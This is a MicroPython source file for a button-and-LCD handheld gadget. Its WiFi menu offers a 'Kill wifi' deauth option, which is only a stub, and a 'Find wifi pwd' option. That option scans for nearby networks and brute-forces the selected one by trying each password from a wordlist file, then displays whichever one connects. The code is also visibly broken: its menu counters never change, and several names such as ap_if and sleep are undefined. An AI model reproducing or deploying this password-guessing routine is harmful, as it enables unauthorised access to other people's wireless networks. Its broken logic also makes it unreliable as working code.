from machine import Pin, SoftSPI, I2C
import time
from I2C_LCD import I2CLcd
import network
import usocket
import micropython


class wifi_module(object):
	global lastdisplay2
	lastdisplay2=""
	
	def __init__(self):
		self.button_up = Pin(20, Pin.IN, Pin.PULL_UP)	 
		self.button_ok = Pin(19, Pin.IN, Pin.PULL_UP)	
		self.button_down = Pin(18, Pin.IN, Pin.PULL_UP)
	
	def __start__(self):
		self.button_up = Pin(20, Pin.IN, Pin.PULL_UP)	 
		self.button_ok = Pin(19, Pin.IN, Pin.PULL_UP)	
		self.button_down = Pin(18, Pin.IN, Pin.PULL_UP)
		menu=0
		self.display("WIFI", 0, True)
		self.updatemenu(self, menu)
		while True:
			if not self.button_up.value() and not menu==0:
				menu-1
				self.updatemenu(self, menu)
			if not self.button_down.value():
				menu+1
				self.updatemenu(self, menu)
			if not self.button_ok.value() and not menu==0:
				self.selectoption(self, menu)
		return
	
	def updatemenu(self, menu):
		i2c = I2C(0, sda=Pin(16), scl=Pin(17), freq=400000)
		devices = i2c.scan()
		lcd = I2CLcd(i2c, 0x3f, 2, 16)
		lcd.clear()
		
		self.display("WIFI", 0, True)
		if menu == 0:
			menu = 1
		if menu == 1:
			self.display(" > Kill wifi    ", 1)
		if menu == 2:
			self.display(" > Find wifi pwd", 1)
		if menu == 3:
			self.display(" > other        ", 1)
		if menu == 4:
			menu = 3
	
	def selectoption(self, menu):
		i2c = I2C(0, sda=Pin(16), scl=Pin(17), freq=400000)
		devices = i2c.scan()
		lcd = I2CLcd(i2c, 0x3f, 2, 16)
		if menu == 1:
			lcd.clear()
			self.display("Deauth", 0, True)
			self.display("press ok to stop", 1)
			while True:
				if not self.button_ok.value():
					print("finished deauth")
					break
		if menu == 2:
			lcd.clear()
			self.display("Find wifi pwd", 0, True)
			a=0
			totaltry="500"
			
			
			sta_if = network.WLAN(network.STA_IF)
			ap_if.disconnect()
			ap_if.active(False)
			sta_if.active(True)
			
			
			networks=sta_if.scan()
			
			networks_list = []
			
			for ap in networks:
				if not ap[5] == 0:
					networks_list.append(str(ap[0]).replace("b'", "").replace("'", ""))
				#print("BSSID: "+str(ap[1]))
				#print("Channel: "+str(ap[2]))
				#print("RSSI: "+str(ap[3]))
				#print("Security: "+str(ap[4]))
			
			selectedSSID=""
			if len(networks_list) > 0:
				self.display("  Select  WIFI  >"+networks_list[0][0:15], 0)
				menu3=1
				while True:
					if not button_down.value() and not menu3==len(networks_list):
						menu3=menu3+1
						self.display("  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
					if not button_up.value() and not menu3==1:
						menu3=menu3-1
						self.display("  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
					if not self.button_ok.value():
						selectedSSID=networks_list[menu3-1]
						break
				print("Selected SSID: "+selectedSSID)
			else:
				self.display("No wifi avaiable", 0)
			sleep(1)
			
			
			
			password="error"
			
			with open(getSetting("password_list"), "r") as fp:
				password=fp.read().split("\r\n")
			totaltry=len(password)
			sta_if.disconnect()
			sleep(2)
			for a in range(len(password)):
				print(str(a)+"/"+str(len(password)))
				
				self.display("                ", 1)
				lenghta=16-len("["+str(a)+"/"+str(totaltry)+"] ")
				self.display("["+str(a)+"/"+str(totaltry)+"] "+password[a][0:lenghta], 1)
				
				try:
					if sta_if.isconnected():
						sta_if.disconnect()
						print("Already connected to network")
						sleep(2)
						
					
					sta_if.connect(selectedSSID, password[a])
					sleep(3)
					if sta_if.isconnected() and not sta_if.status() == 1:
						self.display("                ", 1)
						self.display("pwd: "+password[a], 1)
						while True:
							if not self.button_ok.value():
								break
						break
					print("status: "+str(sta_if.status()))
				except Exception as e:
					self.display("Can't reach wifi", 1)
					print(e)
					break
				if not self.button_ok.value():
					break
			
			ap_if.active(True)
			sta_if.active(False)
			AP_Setup(ssidAP,passwordAP)
			return
		if menu == 3:
			lcd.clear()
			self.display("uwu2 ", 0)
			self.display("uwu2 ", 1)
			
	def display(text, line, middle=False, lastdisplay=lastdisplay2):
		i2c = I2C(0, sda=Pin(16), scl=Pin(17), freq=400000)
		devices = i2c.scan()
		lcd = I2CLcd(i2c, 0x3f, 2, 16)
		if middle:
			lcd.move_to(int(8-len(text)/2), line)
		else:
			lcd.move_to(0, line)
		if text!=lastdisplay:
			lcd.putstr(text)
		lastdisplay=text
